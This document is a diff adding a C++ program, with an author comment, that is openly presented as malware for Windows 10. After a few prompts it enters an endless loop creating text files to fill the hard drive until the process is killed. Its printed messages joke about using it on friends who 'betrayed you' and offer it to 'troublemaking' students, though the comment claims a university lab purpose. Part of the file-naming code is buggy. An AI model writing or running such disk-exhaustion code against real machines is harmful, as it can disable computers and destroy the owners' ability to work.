@@ -1,0 +1,108 @@
+COMMENTS
+##I was going to release an executable for the C++ program below... I thought the better of it!... But there is no point in wasting an opportunity for perfectly viable code to be used purely for educative purposes, and only in a computer science cybersecurity class/lab at university.
+
+#include <iostream>
+#include <fstream>
+#include <string.h>
+
+
+using namespace std;
+
+
+int main()
+{
+    std::cout << "WARNING!!!!!... THIS SOFTWARE PROGRAM HAS NOT BEEN FULLY TESTED!!!... DO NOT USE THIS EXECUTABLE ON YOUR FRIENDS!!!!!... MAYBE UNLESS THEY HAVE BETRAYED YOU!!!!!" << '\n';
+    std::cout << "Please be aware that the full execution of this program may slow down a given computer (especially if multiple executions run simultaneously), and indeed, any full execution on the Windows OS root hard drive partition will likely eventually grind your computer to a halt (especially if the OS page file has been manually minimised to almost, if not nothing). Use at your own caution." << '\n';
+    std::cout << "Disclaimer: This program is intended to offer a prime example to computer science students, the seriousness of the proliferation of malware through the internet, but also through human-to-human viral zeitgeist trends." << '\n';
+    std::cout << "This is relatively benign malware when used responsibly." << '\n';
+    std::cout << "With this first non-SQL program of mine, I proudly bow out of the open source community, but with my honour held high... a parting 'duo' of 'gifts' if you like... on the one hand for the productive members of society to understand malware in a low danger environment... and on the other hand for the more troublemaking yet aspiring members of society (students) to test their appetite for becoming a coder... the BEANO lives on!" << '\n';
+    std::cout << "Nota Bene: 'No' extra carbon will be emitted into the atmosphere in the execution of this program." << '\n';
+    std::cout << "I actually suggest that you close this program now, before it possibly destroys someone's life." << '\n';
+    std::cout << "Do not close the powershell window once eternal ether mode is reached... otherwise you will be unaware that your hard drive is filling up during this windows 10 session.";
+
+
+    string* Initialisation_Answer = new string[1];
+
+    std::cout << '\n';
+    std::cout << '\n';
+    std::cout << "Obsidian_Eternal_Ether_Hard_Drive_Filler_Windows_10... Built On C++... Unnecessarily..." << '\n';
+    std::cout << '\n';
+    std::cout << '\n';
+    std::cout << "INITIATION_STAGE" << '\n';
+    std::cout << "Do you have full legal, moral, and legitimate authority over the dependencies and state of this computer? ... (input y or n, corresponding to either yes or no)" << '\n';
+    std::cin >> *Initialisation_Answer;
+
+    if (*Initialisation_Answer == "y")
+    {
+        std::cout << '\n';
+        std::cout << "EXECUTION_STAGE" << '\n';
+        std::cout << "... depositing a notice of the sin of betrayal on the hard drive...";
+
+        long x = 0;
+        std::string x_Character;
+        while (x < 2)
+        {
+            x = (x + 1);
+            x_Character = x;
+            fstream file;
+            file.open(("Notice Of Betrayal" + x_Character + ".txt"), ios::out);
+            file << "You betrayed me!... Double the severity!... 40 times the length!";
+            file.close();
+        }
+
+        string* After_Party_Answer = new string[1];
+
+        std::cout << '\n';
+        std::cout << "AFTERPARTY_STAGE" << '\n';
+        std::cout << "... Do you happen to know the Scarlett Pimpernell by any chance? ... (input y or n, corresponding to either yes or no)" << '\n';
+        std::cin >> *After_Party_Answer;
+
+        string* Continue_Answer = new string[1];
+
+        if (*After_Party_Answer == "y")
+        {
+            std::cout << "Sarah and Eleanor... two tears, one either side of a drop of blood... the question is, which of the two knows how to dance?" << '\n';
+            std::cout << "Do you want to continue filling up the hard drive with eternal ether? ... (input y or n, corresponding to either yes or no)";
+            std::cin >> *Continue_Answer;
+
+            if (*Continue_Answer == "y")
+            {
+                std::cout << '\n';
+                std::cout << "Do not close this powershell window now that eternal ether mode is reached... otherwise you will be unaware that your hard drive is filling up during this windows 10 session." << '\n';
+                std::cout << "TO STOP THIS PROGRAM, YOU MUST FIRST KILL THE PROCESS IN THE TASK MANAGER!!!!!";
+                
+
+                long y = 0;
+                std::string y_Character;
+                while (1 == 1)
+                {
+                    y = (y + 1);
+                    y_Character = y;
+                    fstream file;
+                    file.open(("Eternal_Ether" + y_Character + ".txt"), ios::out);
+                    file << "8888888888888888888888888888888888888888";
+                    file.close();
+                }
+
+                std::cout << '\n';
+                std::cout << "SHUTDOWN_STAGE" << '\n';
+                std::cout << "The antichrist has been successfully and completely purged... long live the Obsidian Order!";
+            }
+            else
+            {
+                std::cout << '\n';
+                std::cout << "Then why are you wasting my time!";
+            }
+        }
+        else
+        {
+            std::cout << '\n';
+            std::cout << "Too Bad!";
+        }
+    }
+    else
+    {
+        std::cout << '\n';
+        std::cout << "You CRIMINAL!";
+    }
+}
